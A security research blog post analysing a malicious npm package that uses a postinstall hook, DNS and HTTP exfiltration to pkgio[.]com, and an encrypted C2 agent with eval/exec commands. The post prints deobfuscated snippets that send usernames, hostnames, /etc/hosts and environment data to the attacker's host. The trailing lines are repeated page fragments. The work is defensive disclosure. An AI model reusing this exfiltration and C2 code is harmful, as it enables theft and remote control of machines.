@@ -1,0 +1,433 @@
+
+Attack update timeline
+
+May 10, 2022: CodeWhite, a Red Team security company, approached us on Twitter and took ownership over the malicious packages, explaining it was a part of an attack simulation effort for their clients — kudos to them on the elaborate attack!
+May 4, 2022: DigitalOcean reported back that the C2 IP belongs to a security-related company and that they will check and notify.
+May 1, 2022: npm removed the malicious packages from the registry.
+A story about an npm malware
+In recent years, we’ve witnessed a constant increase in the number of malicious packages showing up in various ecosystems. Generally speaking, the vast majority of these packages are benign, as in, they collect information, but don’t do harm to the infected machine. Once in a while, however, we do encounter a truly malicious package that has a purpose, means, and is production-ready — this is a story about one of them.
+Finding actual malware in npm
+As part of the Snyk Security Research team’s focus on proactive malicious packages detection, our main goal is to scan and alert for malicious packages as soon as possible after they appear in an ecosystem’s registry. To assist in this, we’ve built out a robust system that has various mechanisms in place that are set to detect malicious packages.
+IIn just a short time after getting our malicious package trap in place, we already had many libraries being reported as malicious. However, when we dug into the findings we found that many of the reports were about “softly-malicious” packages.
+“Softly-malicious”, as we define it, is when the package is doing one of the following:
+
+Machine-related info exfiltration via DNS lookups (but no further actions)
+Crypto miners (which are bad but are not really interesting malicious-wise)
+Other researcher's “softly-malicious” packages that are mainly for tests
+A few other variations of items in this list
+We eventually fished up a very interesting package — gxm-reference-web-auth-server — and marked it as malicious. We took a quick look and felt something was different, so we spun a VM and looked into the tarball.
+Since the report was for an npm package, the first thing we looked at was the `package.json` file. As expected, it had a post-install script that invoked a JavaScript file from that package. If you aren’t familiar,  post-install scripts are a very common way to make scripts run once npm finishes installing the relevant dependencies — and is also an easy way for malicious actors to run scripts on victims’ machines.
+When we looked into the invoked file, it was obfuscated. However, obfuscation is just a seemingly fancy way of “hiding” your code, but in actuality, it is usually relatively easy to reverse  (at least in JS land).
+The next file in the package that caught our immediate attention was an encrypted file. Our spidey senses started tingling, time to dig in.
+Reversing engineering malware P1: The wrapper
+As said, there were two additional files in the package — an obfuscated one, and an encrypted one:
+1root@3b869b434e7d:/tmp# tar -tvf ./gxm-reference-web-auth-server-1.33.8.tgz
+2-rw-r--r-- 0/0           19023 1985-10-26 08:15 package/confsettingsaaa.js
+3-rw-r--r-- 0/0           97136 1985-10-26 08:15 package/obfusc.enc.js
+4-rw-r--r-- 0/0             393 1985-10-26 08:15 package/package.json
+5
+6# unpacked the tar and:
+7root@3b869b434e7d:/tmp/package# file ./*
+8./confsettingsaaa.js: ASCII text, with very long lines
+9./obfusc.enc.js:      data
+10./package.json:       JSON data
+And the package.json included a post-install script:
+1{
+2  "name": "gxm-reference-web-auth-server",
+3  "version": "1.33.8",
+4  "description": "",
+5  "main": "index.js",
+6  "scripts": {
+7    "postinstall": "node confsettingsaaa.js",
+8    "test": "echo \"Error: no test specified\" && exit 1"
+9  },
+10  "keywords": [],
+11  "dependencies": {
+12    "axios": "0.26.0",
+13    "targz": "1.0.1",
+14    "ldtzstxwzpntxqn": "^4.0.0",
+15    "lznfjbhurpjsqmr": "^0.5.57",
+16    "semver": "7.3.5"
+17  },
+18  "author": "",
+19  "license": "ISC"
+20}
+Although we were first going for the invoked script, we also noted the two gibberish dependencies ldtzstxwzpntxqn and lznfjbhurpjsqmr, and we’ll explore them a little later in this article.
+When we looked into the confsettingsaaa.js file, we saw the following:
+1root@3b869b434e7d:/tmp/package# cat confsettingsaaa.js
+2const a0_0x489fde=a0_0x5400;(function(_0x552d48,_0x2cc03c){const _0x462334=a0_0x5400,_0x2fedb3=_0x552d48();while(!![]){try{const _0x5c5667=-parseInt(_0x462334(0x167))/0x1*(-parseInt(_0x462334(0x10b))/0x2)+-parseInt(_0x462334(0x116))....... # trimmed
+In order to make sense of this file, we used a deobfuscator to make it readable. As we started going through the code, we saw that the file (later to be refered to as P1, since it’s part 1 of the malware) is exfiltrating OS info and the package information via fake subdomain lookups to pkgio[.]com:
+1telemetry = '.pkgio.com'
+2dns.lookup(
+3  replace_special_chars(os.userInfo().username) +
+4  '.' +
+5  replace_special_chars(os.hostname()) +
+6  '.h' +
+7  telemetry,
+8  (err, ip_addr, ip_ver) => {
+9      err && console.log(err.message)
+10  }
+11)
+12var localpack = fs.readFileSync(
+13  path.join(process.cwd(), 'package.json'),
+14  'utf8'
+15)
+16nameresolved = JSON.parse(localpack).name
+17dns.lookup(
+18  replace_special_chars(nameresolved) + '.n' + telemetry,
+19  (err, ip_addr, ip_ver) => {
+20      err && console.log(err.message)
+21  }
+22)
+23process.env.NO_PROXY &&
+24dns.lookup(
+25  replace_special_chars(process.env.NO_PROXY) + '.p' + telemetry,
+26  (err, ip_addr, ip_ver) => {
+27      err && console.log(err.message)
+28  }
+29)
+While this code is exfiltration only, and one might think they won’t do harm, these exfiltrations are actually valuable for the attacker’s reconnaissance, allowing them to identify the target and its setup. The reason, by the way, actors abuse DNS lookups is due to the fact that these types of lookups are usually allowed through firewalls and network filters, thus allowing actors to hit their own DNS servers (for the lookup) and log the requests.
+Moving on, things got more interesting as we kept reading the file. First, all try/catch blocks, if they happen to catch an exception, invoked a `fail` function. Next, we saw that the script was using one of its dependencies: lznfjbhurpjsqmr.
+Before explaining about the (two) dependencies, let's dive first into the fail function (or mechanism). When invoked, the fail function does two main things. First, it cleans up after itself. The “fail” function removes all of the pacakge’s related files and cleans up:
+1function fail() {
+2  try {
+3      fs.unlink(path.join(process.cwd(), 'package.json'), (cb) => {
+4      })
+5      fs.unlink(path.join(process.cwd(), 'confsettingsaaa.js'), (cb) => {
+6      })
+7      fs.existsSync('mac.enc.js') &&
+8      fs.unlink('mac.enc.js', (cb) => {
+9          if (cb) {
+10          }
+11      })
+12      fs.existsSync('mac.dec.js') &&
+13      fs.unlink('mac.dec.js', (cb) => {
+14      // ...more like this
+While this is a cool mechanism for malwares, the next step was alarming.
+After the cleanup, the function creates decoy package.json and index.js files, and logs the following message to the console: “Please refer to the private registry instead of the public repo; Security Team”
+1fs.writeFileSync(
+2  'package.json',
+3  '{\n    "name": "' +
+4  mypackage + // mypackage = 'gxm-reference-web-auth-server'
+5  '",\n    "version": "' +
+6  triggerversion + // the current package version
+7  '",\n    "description": "",\n    "main": "index.js",\n    "scripts": {\n      "test": "echo \'Error: no test specified\' && exit 1"\n    },\n    "keywords": [],\n    "author": "",\n    "license": "ISC"\n  }\n  '
+8)
+9fs.writeFileSync(
+10  'index.js',
+11  "console.log('Please refer to the private registry instead of the public repo; Security Team');\nprocess.exit(-1);\n  "
+12)
+13console.log(
+14  'Please refer to the private registry instead of the public repo; Security Team'
+15)
+16process.exit(-1)
+After reading this, we had a few questions in mind: Why wouldn't the malicious package fully delete itself? Why does it pretend to be a legit placeholder by a security team? Which organization is this package targeting?
+While we were able to answer most of these questions, despite our best efforts to identify and then warn the target, at this point in time we’re still unable to tell which organization is being targeted. With these questions in mind, let’s move on.
+The dependencies: ldtzstxwzpntxqn & lznfjbhurpjsqmr
+As listed above, the package installs two dependencies: ldtzstxwzpntxqn and lznfjbhurpjsqmr. When we visited their npm pages, we saw that both were pushed by the same maintainer, and this is what the maintainer’s page looked like:
+This was interesting to see and confirmed some suspicions about the packages. The dependencies themselves, however, were a mere copy-paste of legitimate packages:
+
+Package name	Original package	Purpose
+ldtzstxwzpntxqn	npmi	Package that gives a simpler API to npm install (programmatically installs things).
+lznfjbhurpjsqmr	global-npm	Require global npm as a local node module.
+As we later confirmed when we audited the rest of the code, these packages were indeed used as the original packages were intended to. Why would the actor put the effort into creating these packages instead of using the original ones? We don’t know, probably never will.
+Filtering victims, private registries, and segway to P2
+
+In the following section, whenever we write "the code bails," we mean that the fail function from above was invoked in order to clean up.
+Since we’re unable to tell which organization is being targeted, we will refer to it as ORG.
+The next step in P1 is to fetch the authorization configuration for private registries from the .npmrc file (this is where lznfjbhurpjsqmr is used). If it fails to find such configurations or such file (the code searches for it machine-wide), it bails.
+If it did find such authorization information, it attempts to download the same package (name-wise) from the private registry specified in the configuration file, while trying a few variants, such as:
+1@ORG/gxm-reference-web-auth-server, ORG/gxm-reference-web-auth-server and gxm-reference-web-auth-server
+Failing to find these in the private registry or failing to download will make the code bail. If it was able to download the tarball from the private registry, it does the following:
+1. npm install the module to a subdirectory called .documentation (installation is done using the ldtzstxwzpntxqn dependency), or bail.
+2. Replace the current content of the package with the contents of the newly installed package, or bail.
+3. Exfiltrate the contents of two network-related files and the new package.json via a POST request:
+1topostfiles = ['package.json', '/etc/hosts', '/etc/resolv.conf']
+2for (var entry of topostfiles) {
+3  if (fs.existsSync(entry)) {
+4      contents = fs.readFileSync(entry, {encoding: 'base64'})
+5      try {
+6          axios({
+7              method: 'post',
+8              url: 'https://www' + telemetry + '/' + entry,
+9              data: {data: contents},
+10              httpsAgent: agent,
+11              maxBodyLength: Infinity,
+12              maxContentLength: Infinity,// …
+4. Decrypt and invoke the encrypted file in a new detached process (encryption algorithm, key, and IV were hard-coded; more about this file in the next section):
+1try {
+2  const child_proc = spawn('node', ['obfusc.dec.js'], {
+3      cwd: process.cwd(),
+4      detached: true,
+5      stdio: 'ignore',
+6      windowsHide: true,
+7  })
+8  child_proc.on('error', (err) => {
+9  })
+10  child_proc.unref()
+11// ...
+5. Clean up all relevant files (this step cleans only the encrypted files and the code for P1)
+6. Terminate.
+Now that we have these laid down, we can tell that unless one has the gxm-reference-web-auth-server package in their private registry, or is inaccessible, the malware will just skip them.
+This implies that:
+
+The package is targeting a specific organization.
+The actor behind these packages knows about the existence of this package in the organization’s private registry.
+With this, we conclude all the steps for P1, and the “malware wrapper” will terminate.
+Reversing engineering malware P2: The agent
+Since the wrapper had the hard-coded information for decrypting the file (a mistake by the adversary we assume), we were able to decrypt it too — and so we did.
+Just like the wrapper, this file was also obfuscated and was a single line of gibberish. However, this time the deobfuscator had  harder time deobfuscating, and it left the code seeded with riddles:
+1(() => {
+2
+3  // IMO webpack stuff?
+4  function _0xa77521(_0x323c64) {
+5      var _0x573f49 = _0x44b56a[_0x323c64]
+6      if (void 0 !== _0x573f49) {
+7          return _0x573f49.exports
+8      }
+9      var _0x3a5d0d = (_0x44b56a[_0x323c64] = {exports: {}})
+10      return (
+11          _0x1cc104[_0x323c64](_0x3a5d0d, _0x3a5d0d.exports, _0xa77521),
+12              _0x3a5d0d.exports
+13      )
+14  };
+15// ...
+We tried a few other deobfuscators, but none produced a better result. We stuck to the initial result and started deobfusacting manually. After a bit of effort, we managed to transform the file into a human readable form. Time to look into the inner workings of the agent.
+Agent registration
+The first thing the agent is instructed to do is register itself with the command and control server (referred to as CNC or C2). By doing this, the agent receives three critical strings that are used for later communication: key and IV for encrypting payloads, and a UUID.
+1async function init_agent() {
+2  try {
+3      axios({
+4          method: 'POST',
+5          url: c2_server + '/register',
+6          data: {engine: 'nodejs'},
+7          headers: {'User-Agent': useragent},
+8          httpsAgent: httpsAgent,
+9      }).then(function (response) {
+10              key = response.data.key,
+11              iv = response.data.iv,
+12              uuid = response.data.uuid,
+13// ...
+Once this request completes, all subsequent communications between the C2 server and the agent will be encrypted/decrypted using these keys and IV (algorithm was hard-coded). Immediately after this request, the agent sends a POST request to the server that contains information about the environment of the agent:
+1// ​​...
+2key = response.data.key,
+3  iv = response.data.iv,
+4  uuid = response.data.uuid,
+5  os_platform = os.platform(),
+6  os_arch = process.arch,
+7  env = JSON.stringify(process.env),
+8  node_version = process.version,
+9  os_username = os.userInfo().username,
+10  hostname = os.hostname
+11datajson = {
+12  platform: os_platform,
+13  architecture: os_arch,
+14  version: node_version,
+15  user: os_username,
+16  hostname: hostname,
+17  environment: env,
+18  engine: 'nodejs',
+19}
+20datastring = JSON.stringify(datajson)
+21encryptdata = encrypt(key, iv, datastring)
+22axios({
+23  method: 'post',
+24  url: c2_server + '/updateinfosnodejs',
+25  data: {
+26      identity: uuid,
+27      data: encryptdata,
+28  },
+29  headers: {'User-Agent': useragent},
+30  httpsAgent: httpsAgent,
+31// ...
+Once this request is sent, the agent moves to its next step.
+The execution loop
+The agent’s execution loop is pretty straightforward. It has few if-elses for various commands and it is executing those with respect to what the C2 server indicated. For example, the agent can delete itself if it gets a delete command, or it can evaluate a snippet if such is sent by the C2:
+1// ...
+2try {
+3  if (
+4      ((response = ''), await sleep(agent_sleep), "delete" == command_type)
+5  ) {
+6      return false  // agent lives as a process, so a “return” equals termination
+7  }
+8  if ('exec' == command_type || "eval" == command_type) {
+9      try {
+10          response = eval(payload)
+11      } catch (error) {
+12          response = error.message
+13      }
+14  } else { // data and file exfiltration
+15      if ('upload' == command_type) {
+16// ...
+Listing them all together, the agent reacts to the following commands:
+1["download", "upload", "exec", "eval", "delete", "register"]
+With those listed, note that exec or eval can execute a reverse shell which will give the attacker complete control over the infected machine. Also note that the register option, when called again, can help the agent and C2 server swap their encryption information and generate new info, in case they’d like to change it.
+While this functionality may seem unique or sophisticated, in the C2 agents world, this is a standard functionality of an agent that you’d plant in a victim’s machine. Regardless, we were not able to correlate the agent’s source code to any known C2 frameworks.
+Concluding the malware
+Now that we have a full understanding of the malware, we can conclude with the following:
+
+The malware is targeting a sole, yet unknown, company. However, given the information we have from the reversing process, this company is expected to have the “gxm-reference-web-auth-server” package in their private registry.
+Since the package is looking for itself in the victim’s private registry, we can also classify this as a package dependency confusion attack, which is a type of a supply chain attack.
+The attacker(s) likely had information about the existence of such a package in the company’s private registry.
+At this point, although we had a clear view of the workings of the package, we decided to see if the C2 server responds and whether this is an active campaign or not. Time to be an imposter.
+Playing “Among Us” with an adversary
+The idea for our following experiment was simple. We wanted to see if there’s someone on the other side of the line, and if so, find out if they are active. In order to do so, we had to do the following:
+
+Use the agent without the wrapper (P1 would filter our client due to lack of .npmrc credentials, etc.)
+Intercept and log all HTTP/S traffic (we wanted to see what the C2 server sends and receives)
+Transfer the logged data in a unidirectional, irreversible, and untraceable way to us (this is important as the attacker can access the machine as well!)
+But, before we acted on these items, we wanted to collect some information about the server itself.
+Is anybody home?
+We collected information about the server using standard WHOIS and Nmap scans. The WHOIS results indicated that the server is hosted in DigitalOcean (to whom we reported the server’s IP), and Nmap scans showed the following:
+1PORT     STATE SERVICE    VERSION
+222/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+32000/tcp open  tcpwrapped
+43306/tcp open  mysql      MySQL 5.5.5-10.1.35-MariaDB-1
+55060/tcp open  tcpwrapped
+68080/tcp open  http       Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+78443/tcp open  ssl/http   Apache httpd
+8Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+The server is not really secure and is alive and listening.
+The imposter
+Coming back to our plan, we had to prepare the following:
+
+Agent code: We have this from the decrypting phase, and we’re able to run separately from the wrapper (P1).
+Interceptors: This had to be implemented in the NodeJS environment, as the agent itself was using NodeJS HTTP/S modules.
+Logging pipeline: We decided to use  Pipedream as it allows for very granular handling of HTTP/S requests, and already have various integrations ready (like value-storage, Slack integration, and more)
+For the interception part, we used the @gr2m/http-recorder library, which did exactly what we aimed for: full capture and manipulation of HTTP/S requests.
+Combining steps 1 and 2, we had the following snippet:
+1httpRecorder.start();
+2httpRecorder.addListener(
+3  'record',
+4  ({request, response, requestBody, responseBody}) => {
+5
+6      if (request.host === hostname) { // we emit http requests as well, but don't want to loop infinitely
+7          return;
+8      }
+9
+10      const buffer = [];
+11
+12      const {method, protocol, host, path} = request;
+13      const reqHeaders = request.getHeaders();
+14
+15      buffer.push({
+16          type: 'request',
+17          method,
+18          protocol,
+19          host,
+20          path,
+21          headers: reqHeaders,
+22          body: Buffer.concat(requestBody).toString()
+23      })
+24      const {statusCode, statusMessage, headers: responseHeaders} = response;
+25      buffer.push({
+26          type: 'response',
+27          statusCode,
+28          statusMessage,
+29          headers: responseHeaders,
+30          body: Buffer.concat(responseBody).toString()
+31      })
+32
+33      send(Buffer.from(JSON.stringify(buffer)).toString('base64'))
+34  }
+35);
+36console.log('[+] Invoking malware...');
+37require('./mal') // here we invoke the agent itselfconsole.log('[+] Malware running! ☠');
+All that’s left is to send it to us. Using Pipedream, we made the send function emit the payload to our endpoint and let us process it.
+For the processing, we stored the IV and key so we could decrypt messages, and we also made the Pipedream pipeline integrate to an anonymous Slack workspace and log the messages to it. This way, every time the agent and the C2 server exchanged messages, we had a Slack notification with all the information decrypted and readable. Below there’s an illustration of our infected machine setup:
+And here’s an example of the output in Slack:
+And just like that, our pseudo-honeypot was ready.
+Hello, it’s me
+Pretty soon after our fake agent was alive and communicating with the C2 server, commands started arriving. The first command was a ls followed by the actor attempting to cat all visible files and attempting to traverse the system. Here’s an example of one of the received commands (after decoding from base64):
+At this point, we’ve decided to halt our experiment as we’ve achieved our goal of determining whether or not there was someone on the other side.
+This implies that there’s an active campaign against the owners of the original/private “gxm-reference-web-auth-server”.
+But wait, there’s more
+Right before we concluded our experiment, we noted something interesting. Aside from the C2 address, there were few other hard-coded values, one of them was the value for the “engine” property in the initial /register call:
+1async function init_agent() {
+2  try {
+3      axios({
+4          method: 'POST',
+5          url: c2_server + '/register',
+6          data: {engine: 'nodejs'}, // ← but why?
+7          headers: {'User-Agent': useragent},
+8          httpsAgent: httpsAgent,
+9      }).then( // … )
+Since we didn’t care about going undetected anymore, we decided to fuzz the value in order to see if there were any other types of targets. After a while, we found more engine types:
+1root@3b869b434e7d:/tmp/package# ./opts.sh
+2[!] response for engine = nodejs
+3{"iv":"jFhDrjFWaCGFjZJE","key":"FsEAsoiDWzYJwrNIgYoonpTRmQhzJvcl","uuid":"a8381854-2986-4754-8cbe-dbf5c0bcb8dd"}
+4
+5[!] response for engine = go
+6{"iv":"dqgIwAQoYKPsziVz","key":"VucfFKCVOFpdkgobVpDjbNXojwPmvbNm","uuid":"5280d805-08cf-4b9e-9bd5-fbe85f5d5014"}
+7
+8[!] response for engine = browser
+9{"uuid":"f820fc90-9618-4d90-9991-9d70cdc1d4f8"}
+This implies that there are at least a browser agent and a Golang agent, and it is not far-fetched to assume there are more.
+Disclosure and moving forward
+Although we know the inner workings of this malware, we can’t tell which organization/company is targeted. Therefore, we’d like to use this platform, (alongside Twitter, etc), to ask the community to warn and be warned of this package, and to feel free to contact us (or DM us @snyksec) with any questions or concerns related to this.
+We’ve also approached DigitalOcean, asking them to remove the C2 server from their service, as well as npm to inform them of the malicious packages and ask them to remove them.
+With that being said, this wraps our journey here. As attacks are complex and sophisticated, we’d like to point out that the initial infiltration vector of this attack is a simple package dependency confusion, which is easy to mitigate. To see the full workflow of this attack, check out the image below. Be safe and stay secure!
+Secure your open source dependencies
+Snyk's dev-first tooling provides one-click fix PRs for vulnerable open source dependencies and their transitive dependencies.
+
+May 10, 2022: CodeWhite, a Red Team security company, approached us on Twitter and took ownership over the malicious packages, explaining it was a part of an attack simulation effort for their clients — kudos to them on the elaborate attack!
+May 4, 2022: DigitalOcean reported back that the C2 IP belongs to a security-related company and that they will check and notify.
+May 1, 2022: npm removed the malicious packages from the registry.
+Machine-related info exfiltration via DNS lookups (but no further actions)
+Crypto miners (which are bad but are not really interesting malicious-wise)
+Other researcher's “softly-malicious” packages that are mainly for tests
+A few other variations of items in this list
+gxm-reference-web-auth-server
+package.json
+ldtzstxwzpntxqn
+lznfjbhurpjsqmr
+confsettingsaaa.js
+pkgio[.]com
+lznfjbhurpjsqmr
+fail
+package.json
+index.js
+ldtzstxwzpntxqn
+lznfjbhurpjsqmr
+Package name
+Original package
+Purpose
+ldtzstxwzpntxqn
+npmi
+Package that gives a simpler API to npm install (programmatically installs things).
+lznfjbhurpjsqmr
+global-npm
+Require global npm as a local node module.
+ldtzstxwzpntxqn
+npmi
+lznfjbhurpjsqmr
+global-npm
+In the following section, whenever we write "the code bails," we mean that the fail function from above was invoked in order to clean up.
+fail
+Since we’re unable to tell which organization is being targeted, we will refer to it as ORG.
+ORG
+.npmrc
+lznfjbhurpjsqmr
+npm install
+.documentation
+ldtzstxwzpntxqn
+The package is targeting a specific organization.
+The actor behind these packages knows about the existence of this package in the organization’s private registry.
+POST
+delete
+exec
+eval
+register
+The malware is targeting a sole, yet unknown, company. However, given the information we have from the reversing process, this company is expected to have the “gxm-reference-web-auth-server” package in their private registry.
+Since the package is looking for itself in the victim’s private registry, we can also classify this as a package dependency confusion attack, which is a type of a supply chain attack.
+The attacker(s) likely had information about the existence of such a package in the company’s private registry.
+Use the agent without the wrapper (P1 would filter our client due to lack of .npmrc credentials, etc.)
+Intercept and log all HTTP/S traffic (we wanted to see what the C2 server sends and receives)
+Transfer the logged data in a unidirectional, irreversible, and untraceable way to us (this is important as the attacker can access the machine as well!)
+Agent code: We have this from the decrypting phase, and we’re able to run separately from the wrapper (P1).
+Interceptors: This had to be implemented in the NodeJS environment, as the agent itself was using NodeJS HTTP/S modules.
+Logging pipeline: We decided to use  Pipedream as it allows for very granular handling of HTTP/S requests, and already have various integrations ready (like value-storage, Slack integration, and more)
+send
+ls
+cat
+/register
